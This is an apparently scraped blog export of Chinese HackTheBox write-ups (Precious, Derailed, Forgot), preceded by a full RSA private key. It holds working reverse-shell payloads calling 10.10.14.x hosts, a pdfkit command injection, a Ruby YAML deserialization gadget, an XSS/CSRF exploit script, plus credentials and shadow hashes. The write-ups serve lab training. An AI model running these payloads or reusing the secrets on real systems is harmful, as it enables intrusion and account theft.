KEY-----MIIEpAIBAAKCAQEAxhCO2ZdFzdJj6zdL&#x2F;L38ZGE7OzyRCnJ4qZJyz50X7Ux9JHWT7kZWP3uElhlwF2WbqsPoS&#x2F;iUtAjV9keflS&#x2F;38zfZEp1n&#x2F;o7g+q8Fw+oxF0s&#x2F;6fudhA4KieW&#x2F;bKnG+aeaC&#x2F;lBgx5L5EGqsw+RKeBqFmCVi8ySy1SEH4vy7mZzWO4w6EgyywWyk1gxGBEUuq1xVT0Wvagw+AQtkTJ9jo7wEGA1kAsY0G02hbwelLSPppTx72EiPyr2hb9m5pwK6ywz38+4h4dPkyijcbaR0LNNKzDaeBGD78RxbnszHUTXKO&#x2F;EsQYDqEYqbFkSMgoMylW8wbxtS1I7T+TW4+tvQzgw9QIDAQABAoIBAQCH384PqX4Cj6VqNHoVfcQKnMVEgu1BTHxIYCYRFUTXztQ+0cZU&#x2F;L2oOTUgv3ytIFBlGpZen75rr3AQztvEPa8MlDB&#x2F;W6p+8EeY0b7TwvJAd6f1&#x2F;V32vKcwKINkqSfOFtNQCYOOzpbjlMTkp&#x2F;Y+0ywUA9gzmnjNskIdXiWetHvG8hNBArCU2h9CdlAr2thi3j1j3DR7VBUvuwtw6ny1422XL8xyIMg1qjLh9kFy6Ndif+GmnzuoQW4a18lDflIZQC+03MPRaZUuUbVEpTIDztWjs1+YeVoGPq4nzy+1RsyrxCdA+0+0j6ZK6&#x2F;++vJPsm+V1&#x2F;xaModV+XRygTjsQ0MJBAoGBAOnZ7qtDS&#x2F;3qSXV6e+kzYcJUTF1d18gXaKfrEm3y09eKJ9mnApTffW99PlP+wK+eLUbsdxz9xiBxGGuxB+XYclDLIkoIn2308ruBptYMz7LYkcaypsCBXEdi5bY8PlkXICXVhLaFNACydFf0Ve8cj4XG2t1WcBhKbVgCvIKbrzhxAoGBANjS7TmGIIdZarvx4icPboemviW6wbXYY79jGFA+zvQ6DFt3cNoLYKpFfzZoaOXrJyixocFijM0Jc+BX0c13bhCgnjxnZ2&#x2F;IV3ggeEjKVeuV5wx1+TzdjpR0EAbvWUjd2Q41xSL6kSRI+Po&#x2F;6Tn9GuzWidMrygWMNT1JhEVVbuLFAoGALDI1+0QyvoBi9cL6XC6L0VBhRlwQBg72hpXU29bC1r+TnH0F7eD3MfT3rKQ&#x2F;AnHgmMDkGiSUJ1l4hhHlLjlkEYTyrA9JIlzi6zEruNSfBGwN0QG+pi9Mo2k7hN+J4QiP2NaryFsQYvlXJ7BT9WbucRgOETre4JhgZfvOaNjHmuECgYBnW70cA9Uz0CsyJq8g4ZlV7uWLxMgcsGd0T3&#x2F;CmP48rANCAuD4AB53bKOkwwbmOz+yhWLPdfQatZvYYOSxZnJAWOC1eLF1NvKDYC8Wu+VTZWT7qq1CF3elSuJs++H6+05CGN29u+Y+fs65NIgwTXhtWCPhV2l5VYn3ijkUeBJg5QKBgQChntZ26dV5zBuH+sUBFDD38ATjMKWwKBy4EhogrPP1WPODi7MfPlSW9Pp&#x2F;C6+rAd91VPcGo6TJD15CDhzTfzffHnjZJ0Nb6HDRL7mw6oimwVTLJttUk8GVQGGCfL85CcYSjPpqQp8ZOml4k&#x2F;SaSzDUhb06PCuFi+i4afyuQyHAzw&#x3D;&#x3D;-----END RSA PRIVATE KEY----- 参考资料 XSS-Payloads/Without-Parentheses.md at master · RenwaX23/XSS-Payloadshttps://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md Exploit docker.sock to mount root filesystem in a containerhttps://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25 Extension - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Extension-HTB-Discussion Writeup Extension HackTheBoxhttps://gatogamer1155.github.io/hackthebox/extension/ HTB - Extension [Hard] // MeowMeowAttack’s security.loghttps://meowmeowattack.github.io/htb/extension/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Precious - HackTheBox","slug":"Precious-HackTheBox","date":"2022-12-03T07:59:29.000Z","updated":"2023-05-22T01:38:13.960Z","comments":true,"path":"2022/12/03/Precious-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/12/03/Precious-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/513 10.10.11.189 端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV -Pn 10.10.11.189Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-03 15:24 CSTNmap scan report for 10.10.11.189Host is up (0.31s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 845e13a8e31e20661d235550f63047d2 (RSA)| 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)|_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519)80/tcp open http nginx 1.18.0|_http-server-header: nginx/1.18.0|_http-title: Did not follow redirect to http://precious.htb/2161/tcp filtered apc-agent8045/tcp filtered unknownService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 95.64 seconds 80需要加hosts： 110.10.11.189 precious.htb 输入URL转换成PDF： pdfkit测试pdf转换，发现使用pdfkit v0.8.6： 搜到相关漏洞： Command Injection in pdfkit | CVE-2022-25765 | Snykhttps://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 reverse shell打到ruby shell： 1http:&#x2F;&#x2F;10.10.14.10:7777&#x2F;?name&#x3D;#&#123;&#39;%20&#96;ruby -rsocket -e&#39;spawn(&quot;sh&quot;,[:in,:out,:err]&#x3D;&gt;TCPSocket.new(&quot;10.10.14.10&quot;,4444))&#39;&#96;&#39;&#125; 信息bundle config中得到henry用户密码： 1henry:Q3c1AqGHtoI0aXAYFH user flaghenry用户ssh登录，得到user flag： 提权信息sudo -l 发现一个ruby脚本，调用yaml，找到原本的yaml文件确认yaml库版本： yamlyaml反序列化： Blind Remote Code Execution through YAML Deserializationhttps://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/ 提权 &amp; root flag构造一个恶意yml文件，调用ruby脚本触发命令执行： dependencies.yml12345678910111213141516171819---- !ruby/object:Gem::Installer i: x- !ruby/object:Gem::SpecFetcher i: y- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: \"abc\" debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module 'Kernel' method_id: :system git_set: chmod +s /usr/bin/bash method_id: :resolve shadow12root:$y$j9T$a.ggVdbxv0sDezKDImKn91$BB2mMoZ0UwInxNcXuyDALhr4li59AHfVw5DuV0d5Ww1:19284:0:99999:7:::henry:$y$j9T$Q&#x2F;v28PgszKjK0KDbSATMs1$7K1zLKHnnClQLLI92aeVT9HQXA6bgaG4BOTgLTGi.gA:19261:0:99999:7::: 参考资料 Command Injection in pdfkit | CVE-2022-25765 | Snykhttps://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 Blind Remote Code Execution through YAML Deserializationhttps://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/ Precious - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Precious-HTB-Discussion HTB - Precious [Easy] // meowmeowattackhttps://meowmeowattack.github.io/htb/precious/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Derailed - HackTheBox","slug":"Derailed-HackTheBox","date":"2022-11-28T01:04:20.000Z","updated":"2023-07-24T01:20:02.840Z","comments":true,"path":"2022/11/28/Derailed-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/11/28/Derailed-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/512 10.10.11.190 端口扫描22和3000: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.190Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-26 20:26 CSTNmap scan report for 10.10.11.190Host is up (0.32s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 1623b09ade0e3492cb2b18170ff27b1a (RSA)| 256 50445e886b3e4b5bf9341dede52d91df (ECDSA)|_ 256 0abd9223df44026f278da6abb4077837 (ED25519)3000/tcp open http nginx 1.18.0|_http-title: derailed.htb|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 287.58 seconds 3000clipnote： 目录扫描目录扫描发现rails,(最重要的是rails这个，dirsearch默认能扫出来，gobuster常规扫描没这个结果)： 1234567891011121314gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://10.10.11.190:3000//500 (Status: 200) [Size: 1635]/404 (Status: 200) [Size: 1722]/administration (Status: 302) [Size: 96] [--&gt; http://10.10.11.190:3000/login]/favicon.ico (Status: 200) [Size: 0]/logout (Status: 302) [Size: 91] [--&gt; http://10.10.11.190:3000/]/login (Status: 200) [Size: 5592]/robots.txt (Status: 200) [Size: 99]/register (Status: 200) [Size: 5908]dirsearch -u http://10.10.11.190:3000/[20:10:32] 200 - 2KB - /rails/info/properties /rails/info/propertiesrails的环境变量等信息： routes根据文档查看routes，得到所有路由信息： Class: Rails::InfoController — Documentation for rails/rails (main)https://www.rubydoc.info/github/rails/rails/Rails/InfoController clipnotes随意测试提交，修改id为1知道alice用户： report另外存在report功能，应该是后端有个bot会查看我们提交的内容： XSS &amp; CSRF用到的漏洞是这个，因为cookie有httponly，所以需要结合csrf进行利用： 1530898 Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag https://hackerone.com/reports/1530898 大概流程 通过XSS去获取administration页面的结构 获取有效csrf token，攻击/administration/reports xss注册用户名，xss： 12# &lt;any 40 characters&gt;&lt;bypass-pattern&gt;&lt;xss-payload&gt;miaomiaomiaomiaomiaomiaomiaomiaomiaomiao&lt;select&lt;style&#x2F;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.3:7777&quot;&gt; xss payload作为用户名，任意内容提交report，测试执行，成功触发xss： 后续就是一步步，通过xss获取信息,根据获取到的后台信息，我们知道需要获取有效的authenticity_token，然后csrf利用report_log处的命令注入： 要发帖，我们需要先制作一个恶意表单，然后分配获取authenticity_token的和 cmd 注入负载 最终构造出完整exp,整段js编码后注入到用户名中： Character Code Finderhttp://www.mauvecloud.net/charsets/CharCodeFinder.html 1miaomiaomiaomiaomiaomiaomiaomiaomiaomiao&lt;select&lt;style&#x2F;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.3:7777&quot; onerror&#x3D;&quot;eval(String.fromCharCode(&lt;obfuscated-char-code&gt;))&quot;&gt; 测试，每一步都成功执行，包括测试的curl命令注入： reverse shell修改命令，得到reverse shell： 1document.getElementById(&#39;badform&#39;).elements.report_log.value &#x3D; &#39;|python3 -c \\&#39;import pty;import socket,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.3&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;bash&quot;)\\&#39;&#39;; vuln查看代码可以看到是直接用了ruby的open函数，特性导致的命令注入： Module: Kernel (Ruby 2.1.0)https://ruby-doc.org/core-2.1.0/Kernel.html#method-i-open 如果path以管道字符 ( &quot;|&quot;) 开头，则会创建一个子进程，并通过一对管道连接到调用者。返回的IO对象可用于写入标准输入并从此子进程的标准输出中读取。 12345# /var/www/rails-app/app/controllers/admin_controller.rbreport_log = params[:report_log]begin file = open(report_log) administration123456&lt;form method=\"post\" action=\"/administration/reports\"&gt; &lt;input type=\"hidden\" name=\"authenticity_token\" id=\"authenticity_token\" value=\"&lt;authenticity_token&gt;\" autocomplete=\"off\"&gt; &lt;input type=\"text\" class=\"form-control\" name=\"report_log\" value=\"report_23_11_2022.log\" hidden=\"\"&gt; &lt;label class=\"pt-4\"&gt; 23.11.2022&lt;/label&gt; &lt;button name=\"button\" type=\"submit\"&gt;Download&lt;/button&gt;&lt;/form&gt; token.js123456789var xmlHttp = new XMLHttpRequest();xmlHttp.open( \"GET\", \"http://derailed.htb:3000/administration\", true);xmlHttp.send( null );// an arbitrary delay to ensure the page is renderedsetTimeout(function() &#123; var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html'); var token = doc.getElementById('authenticity_token').value;&#125;, 2000); evilform.js123456// just copy the form code from above and clean it up a bitvar newForm = new DOMParser().parseFromString('&lt;form id=\"badform\" method=\"post\" action=\"/administration/reports\"&gt; &lt;input type=\"hidden\" name=\"authenticity_token\" id=\"authenticity_token\" value=\"placeholder\" autocomplete=\"off\"&gt; &lt;input id=\"report_log\" type=\"text\" class=\"form-control\" name=\"report_log\" value=\"placeholder\" hidden=\"\"&gt; &lt;button name=\"button\" type=\"submit\"&gt;Submit&lt;/button&gt;', 'text/html');document.body.append(newForm.forms.badform);document.getElementById('badform').elements.report_log.value = '|curl http://&lt;ip&gt;/?cmdi';document.getElementById('badform').elements.authenticity_token.value = token;document.getElementById('badform').submit(); exp.js12345678910111213141516171819202122var xmlHttp = new XMLHttpRequest();xmlHttp.open( \"GET\", \"http://derailed.htb:3000/administration\", true);xmlHttp.send( null );// send a signal to indicate which step has been achievedvar x = document.createElement(\"IMG\");x.src = 'http://10.10.14.3:7777/?step1';setTimeout(function() &#123; // send a signal to indicate which step has been achieved var x = document.createElement(\"IMG\"); x.src = 'http://10.10.14.3:7777/?step2'; // fetch the token var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html'); var token = doc.getElementById('authenticity_token').value; // craft the form var newForm = new DOMParser().parseFromString('&lt;form id=\"badform\" method=\"post\" action=\"/administration/reports\"&gt; &lt;input type=\"hidden\" name=\"authenticity_token\" id=\"authenticity_token\" value=\"placeholder\" autocomplete=\"off\"&gt; &lt;input id=\"report_log\" type=\"text\" class=\"form-control\" name=\"report_log\" value=\"placeholder\" hidden=\"\"&gt; &lt;button name=\"button\" type=\"submit\"&gt;Submit&lt;/button&gt;', 'text/html'); document.body.append(newForm.forms.badform); // assign the values document.getElementById('badform').elements.report_log.value = '|curl http://10.10.14.3:7777/?cmdi'; document.getElementById('badform').elements.authenticity_token.value = token; document.getElementById('badform').submit();&#125;, 2000); user flagrails用户shell中写公钥后ssh连接，方便后续操作，rails用户目录得到user flag: 信息/var/www/rails-app/db/development.sqlite3中可以得到两个hash： 1234sqlite&gt; select username,password_digest,role from users where id&lt;5;select username,password_digest,role from users where id&lt;5;alice|$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI7.|administratortoby|$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle|user 可以破解出来toby的密码： 123sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txtgreenday alice/var/www/rails-app/ 中，查看git log，可以得到alice的密码： 12345678git loggit checkout 61995bf40dcb332b8979adc32152d73e5546e40c -frails@derailed:/var/www/rails-app$ cat db/seeds.rbcat db/seeds.rbUser.create(username: \"alice\", password: \"recliner-bellyaching-bungling-continuum-gonging-laryngitis\", role: \"administrator\")Note.create(content: \"example content\", author: \"alice\") openmediavault-webgui查看存在的用户，得到的toby密码可以切换到openmediavault-webgui： 12345678rails@derailed:/var/www/rails-app$ cat /etc/passwd | grep bashcat /etc/passwd | grep bashroot:x:0:0:root:/root:/bin/bashopenmediavault-webgui:x:999:996:Toby Wright,,,:/home/openmediavault-webgui:/bin/bashrails:x:1000:100::/home/rails:/bin/bashmarcus:x:1001:1002:,,,:/home/marcus:/bin/bashsu - openmediavault-webgui 12openmediavault-webgui@derailed:~$ ls -al /etc/openmediavault/config.xml-rw-rw---- 1 root openmediavault-config 18838 May 30 07:13 /etc/openmediavault/config.xml omv 工具存储在/usr/sbin/. 由于此应用程序用于管理对资源的访问控制。我们可以使用它为高权限用户添加新的访问方法。在这种情况下，我们可以让 root 用户接受我们的public ssh key，这样我们就可以以 root 身份通过 ssh 进入目标 [GUIDE] Enable SSH with Public Key Authentication (Securing remote webUI access to OMV) - Guides - openmediavaulthttps://forum.openmediavault.org/index.php?thread/7822-guide-enable-ssh-with-public-key-authentication-securing-remote-webui-access-to/ 提权 &amp; root flag按照文档转换ssh公钥格式，修改配置文件，例如把test user修改为root ssh登录，然后替换配置文件，应用生效，登录: 1234567891011121314# localssh-keygen -e -f ~/.ssh/id_rsa.pub# targetwget http://10.10.14.3:7777/config.xml -O /etc/openmediavault/config.xml# 如果格式错误的话，直接在靶机上编辑nano /etc/openmediavault/config.xml/usr/sbin/omv-confdbadm read conf.system.usermngmnt.user/usr/sbin/omv-rpc -u admin \"config\" \"applyChanges\" \"&#123; \\\"modules\\\": [\\\"ssh\\\"],\\\"force\\\": true &#125;\"# localssh root@10.10.11.190 shadow12345root:$y$j9T$4H76C3VvReuiPfwg2kJ8T&#x2F;$UAFsX2eC7xz.RgSYn.wNsvbIagSoGNBaoh.0&#x2F;aNhrf4:19142:0:99999:7:::openmediavault-webgui:$y$j9T$5FjjCWAt5JVaJCyw&#x2F;KHjG1$6yADlnRZw4SaNH2XhzZKUoRrfQ5onFI1NlJf6TJvaa&#x2F;:19142::::::admin:$y$j9T$PHYLhHAg5Wed7QQtpsP0f&#x2F;$UJgxXh80c.lnsQD5XsEs3chxm8mgMYSieH2co43LBm6:19142::::::rails:$y$j9T$XKsVDJvXU7bCdmtkyEbYw.$4NTgDJCx3bQpd7hK9WATNhDGXvrcOa0Kqk80xsvvV01:19142:0:99999:7:::marcus:$y$j9T$.lfKUaVKg3P24jmnZrODU&#x2F;$RfQgNk01oAIKipNEBeFxX6Uv9UvI6CpRCiXun.3loUA:19316:0:99999:7::: 参考资料 Class: Rails::InfoController — Documentation for rails/rails (main)https://www.rubydoc.info/github/rails/rails/Rails/InfoController 1530898 Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag https://hackerone.com/reports/1530898 Character Code Finderhttp://www.mauvecloud.net/charsets/CharCodeFinder.html Module: Kernel (Ruby 2.1.0)https://ruby-doc.org/core-2.1.0/Kernel.html#method-i-open [GUIDE] Enable SSH with Public Key Authentication (Securing remote webUI access to OMV) - Guides - openmediavaulthttps://forum.openmediavault.org/index.php?thread/7822-guide-enable-ssh-with-public-key-authentication-securing-remote-webui-access-to/ Derailed - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Derailed-HTB-Discussion HTB - Derailed [Insane] // meowmeowattackhttps://meowmeowattack.github.io/htb/derailed/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Forgot - HackTheBox","slug":"Forgot-HackTheBox","date":"2022-11-14T13:16:03.000Z","updated":"2023-03-06T01:07:04.641Z","comments":true,"path":"2022/11/14/Forgot-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/11/14/Forgot-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/511 10.10.11.188 端口扫描22和80: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118$ nmap -sC -sV -Pn 10.10.11.188Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-14 20:32 CSTNmap scan report for 10.10.11.188Host is up (0.20s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)| 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)|_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)80/tcp open http Werkzeug/2.1.2 Python/3.8.10|_http-title: Login|_http-server-header: Werkzeug/2.1.2 Python/3.8.10| fingerprint-strings:| FourOhFourRequest:| HTTP/1.1 404 NOT FOUND| Server: Werkzeug/2.1.2 Python/3.8.10| Date: Mon, 14 Nov 2022 12:33:15 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 207| X-Varnish: 294936| Age: 0| Via: 1.1 varnish (Varnish/6.2)| Connection: close| &lt;!doctype html&gt;| &lt;html lang=en&gt;| &lt;title&gt;404 Not Found&lt;/title&gt;| &lt;h1&gt;Not Found&lt;/h1&gt;| &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;| GetRequest:| HTTP/1.1 200 OK| Server: Werkzeug/2.1.2 Python/3.8.10| Date: Mon, 14 Nov 2022 12:32:13 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 5698| X-Varnish: 294932 32771| Age: 55| Via: 1.1 varnish (Varnish/6.2)| Accept-Ranges: bytes| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en\" &gt;| &lt;head&gt;| &lt;meta charset=\"UTF-8\"&gt;| &lt;title&gt;Login&lt;/title&gt;| &lt;style&gt;| @import url(\"https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap\");| margin: 0;| padding: 0;| box-sizing: border-box;| font-family: \"Poppins\", sans-serif;| :root &#123;| --dark-dimmed: #fff;| --accent: #008080;| --accent-dimmed: #008080;| --light: #fff;| body &#123;| display: flex;| justify-content: center;| align-items: center;| min-height: 100vh;| margin: 10px;| background:| HTTPOptions:| HTTP/1.1 200 OK| Server: Werkzeug/2.1.2 Python/3.8.10| Date: Mon, 14 Nov 2022 12:33:09 GMT| Content-Type: text/html; charset=utf-8| Allow: HEAD, GET, OPTIONS| Content-Length: 0| X-Varnish: 40| Age: 0| Via: 1.1 varnish (Varnish/6.2)| Accept-Ranges: bytes| Connection: close| RTSPRequest:|_ HTTP/1.1 400 Bad Request1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port80-TCP:V=7.93%I=7%D=11/14%Time=63723584%P=x86_64-apple-darwin21.5.0SF:%r(GetRequest,1749,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.1\\SF:.2\\x20Python/3\\.8\\.10\\r\\nDate:\\x20Mon,\\x2014\\x20Nov\\x202022\\x2012:32:13SF:\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-LengSF:th:\\x205698\\r\\nX-Varnish:\\x20294932\\x2032771\\r\\nAge:\\x2055\\r\\nVia:\\x201SF:\\.1\\x20varnish\\x20\\(Varnish/6\\.2\\)\\r\\nAccept-Ranges:\\x20bytes\\r\\nConnecSF:tion:\\x20close\\r\\n\\r\\n\\n\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"\\x20&gt;SF:\\n\\n&lt;head&gt;\\n\\n\\x20\\x20&lt;meta\\x20charset=\\\"UTF-8\\\"&gt;\\n\\x20\\x20\\n\\n\\x20\\x20SF:&lt;title&gt;Login&lt;/title&gt;\\n\\x20\\x20\\n\\x20\\x20\\n\\x20\\x20\\n\\x20\\x20\\n&lt;style&gt;\\nSF:@import\\x20url\\(\\\"https://fonts\\.googleapis\\.com/css2\\?family=Poppins:iSF:tal,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,SF:200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap\\\"\\);\\n\\n\\*\\xSF:20&#123;\\n\\x20\\x20margin:\\x200;\\n\\x20\\x20padding:\\x200;\\n\\x20\\x20box-sizing:SF:\\x20border-box;\\n\\x20\\x20font-family:\\x20\\\"Poppins\\\",\\x20sans-serif;\\n&#125;SF:\\n\\n:root\\x20&#123;\\n\\x20\\x20--dark-dimmed:\\x20#fff;\\n\\x20\\x20--accent:\\x20#SF:008080;\\n\\x20\\x20--accent-dimmed:\\x20#008080;\\n\\x20\\x20--light:\\x20#fffSF:;\\n&#125;\\n\\nbody\\x20&#123;\\n\\x20\\x20display:\\x20flex;\\n\\x20\\x20justify-content:\\SF:x20center;\\n\\x20\\x20align-items:\\x20center;\\n\\x20\\x20min-height:\\x20100SF:vh;\\n\\x20\\x20margin:\\x2010px;\\n\\x20\\x20background:\\x20\")%r(HTTPOptions,SF:114,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\SF:.8\\.10\\r\\nDate:\\x20Mon,\\x2014\\x20Nov\\x202022\\x2012:33:09\\x20GMT\\r\\nContSF:ent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20HEAD,\\x20GET,\\x20SF:OPTIONS\\r\\nContent-Length:\\x200\\r\\nX-Varnish:\\x2040\\r\\nAge:\\x200\\r\\nViaSF::\\x201\\.1\\x20varnish\\x20\\(Varnish/6\\.2\\)\\r\\nAccept-Ranges:\\x20bytes\\r\\nSF:Connection:\\x20close\\r\\n\\r\\n\")%r(RTSPRequest,1C,\"HTTP/1\\.1\\x20400\\x20BaSF:d\\x20Request\\r\\n\\r\\n\")%r(FourOhFourRequest,1BF,\"HTTP/1\\.1\\x20404\\x20NOTSF:\\x20FOUND\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.8\\.10\\r\\nDate:\\x2SF:0Mon,\\x2014\\x20Nov\\x202022\\x2012:33:15\\x20GMT\\r\\nContent-Type:\\x20text/SF:html;\\x20charset=utf-8\\r\\nContent-Length:\\x20207\\r\\nX-Varnish:\\x2029493SF:6\\r\\nAge:\\x200\\r\\nVia:\\x201\\.1\\x20varnish\\x20\\(Varnish/6\\.2\\)\\r\\nConnecSF:tion:\\x20close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20lang=en&gt;\\n&lt;title&gt;404SF:\\x20Not\\x20Found&lt;/title&gt;\\n&lt;h1&gt;Not\\x20Found&lt;/h1&gt;\\n&lt;p&gt;The\\x20requested\\x2SF:0URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20server\\.\\x20If\\x20you\\x20enSF:tered\\x20the\\x20URL\\x20manually\\x20please\\x20check\\x20your\\x20spelling\\SF:x20and\\x20try\\x20again\\.&lt;/p&gt;\\n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 196.99 seconds 80登录界面，存在忘记密码功能： forgot password需要一个有效用户名，首页源码注释里可以得到用户名： host header 注入使用有效用户名重置密码响应已发送重置链接，修改host header可以得到对应reset token： Support Portaltoken有效期很短，并且要注意url编码，重置密码成功后登录进portal： ticketstickets功能在前端被禁用，启用后访问提示ACCESS_DENIED，查看请求发现是http basic认证,使用的是我们的robert-dev-367120用户名和密码，尝试修改用户名为admin，成功，得到diego的ssh密码： (论坛说这一步可能是非预期 预期的方法是在重置罗伯特的密码后简单地提交票证。链接字段中有一个“http”过滤器，但是您可以使用 HTTP 绕过它。设置一个 netcat 监听器，几分钟后机器人点击链接，您可以在 Authentication 标头中看到 base64，您可以对其进行解码并获取管理员密码。) 1diego:dCb#1!x0%gjq User flagdiego用户登录，得到user flag： 提权信息bot.py中得到数据库账号密码, 以及admin原本的密码: 123456conn = mysql.connector.connect(host=\"localhost\",database=\"app\",user=\"diego\",password=\"dCb#1!x0%gjq\")requests.get(i[2],headers=&#123;'Authorization':'Basic YWRtaW46ZEN2YmdGaDM0NV8zNjgzNTJjQCE='&#125;)# base64 decodeadmin:dCvbgFh345_368352c@! sudo -l发现ml_security.py,看起来是从数据库获取数据后进行一些处理： tensorflow preprocess_input_exprs_arg_string代码中使用了tensorflow的preprocess_input_exprs_arg_string，并且指定了safe=false这个可以搜到相关漏洞： Code injection in saved_model_cli in TensorFlow · CVE-2022-29216 · GitHub Advisory Databasehttps://github.com/advisories/GHSA-75c9-jrh4-79mc 1preprocess_input_exprs_arg_string(data[i],safe=False) # ln: 141 根据代码逻辑，是从escalate表中获取reason,然后检查xss 恶意模式，满足条件后执行preprocess_input_exprs_arg_string 因此，我们可以用恶意内容覆盖数据库reason并运行脚本来执行我们的命令 ml_security.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#!/usr/bin/python3import sysimport csvimport pickleimport mysql.connectorimport requestsimport threadingimport numpy as npimport pandas as pdimport urllib.parse as parsefrom urllib.parse import unquotefrom sklearn import model_selectionfrom nltk.tokenize import word_tokenizefrom sklearn.linear_model import LogisticRegressionfrom gensim.models.doc2vec import Doc2Vec, TaggedDocumentfrom tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_stringnp.random.seed(42)f1 = '/opt/security/lib/DecisionTreeClassifier.sav'f2 = '/opt/security/lib/SVC.sav'f3 = '/opt/security/lib/GaussianNB.sav'f4 